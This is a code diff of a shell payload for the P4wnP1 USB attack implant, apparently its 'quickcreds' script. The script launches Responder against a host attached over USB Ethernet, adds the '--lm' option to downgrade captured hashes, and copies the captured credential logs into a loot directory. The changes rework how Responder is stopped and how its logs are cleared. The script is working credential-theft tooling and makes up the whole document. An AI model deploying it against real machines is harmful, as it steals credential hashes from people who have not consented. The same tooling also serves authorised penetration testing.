@@ -11,7 +11,7 @@
 # Option number: 252 Option string: http://172.16.0.1/wpad.dat
 
 
-RESPONDER_OPTIONS="-f -w -r -d -F -P -v --upstream-proxy=UPSTREAM_PROXY"
+RESPONDER_OPTIONS=" -w -F -P -v --upstream-proxy=UPSTREAM_PROXY --lm"
 LOOTDIR=/usr/local/P4wnP1/www/loot/quickcreds
 TARGET_HOSTNAME=$(cat /tmp/dnsmasq_usbeth.leases | cut -d " " -f4);
 TARGET_IP=$(cat /tmp/dnsmasq_usbeth.leases | cut -d " " -f3);
@@ -24,11 +24,23 @@ if [ ! -f /usr/sbin/responder ]; then
   fi
 
 echo "[*] Killing Responder..."
-killall /usr/bin/python2
-killall /usr/bin/python2
+process=$(ps aux | grep 'Responder' | grep -v 'grep')
+
+# Check if the process was found
+if [ ! -z "$process" ]; then
+    # Extract the PID
+    pid=$(echo $process | awk '{print $2}')
+
+    # Kill the process
+    kill $pid
+
+    echo "Process 'Responder' with PID $pid has been terminated."
+else
+    echo "No 'Responder' process found."
+fi
 
 echo "[*] Clearing responder logs directory..."
-rm /usr/share/responder/logs/*
+rm -f /usr/share/responder/logs/* 2>/dev/null
 
 echo "[*] Creating loot dir..."
 mkdir -p $LOOTDIR
@@ -57,9 +69,21 @@ echo "[*] Copying responder data to loot directory..."
 cp /usr/share/responder/logs/* /usr/local/P4wnP1/www/loot/quickcreds/$HOST-$COUNT
 cp /usr/share/responder/logs/* $LOOTDIR/$HOST-$COUNT
 echo "[*] Clearing responder logs directory..."
-rm /usr/share/responder/logs/*
+rm -f /usr/share/responder/logs/* 2>/dev/null
 echo "[*] Killing Responder..."
-killall /usr/bin/python2
-killall /usr/bin/python2
-killall /usr/bin/python2
+process=$(ps aux | grep 'Responder' | grep -v 'grep')
+
+# Check if the process was found
+if [ ! -z "$process" ]; then
+    # Extract the PID
+    pid=$(echo $process | awk '{print $2}')
+
+    # Kill the process
+    kill $pid
+
+    echo "Process 'Responder' with PID $pid has been terminated."
+else
+    echo "No 'Responder' process found."
+fi
+
 P4wnP1_cli hid run -c 'press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);' >/dev/null
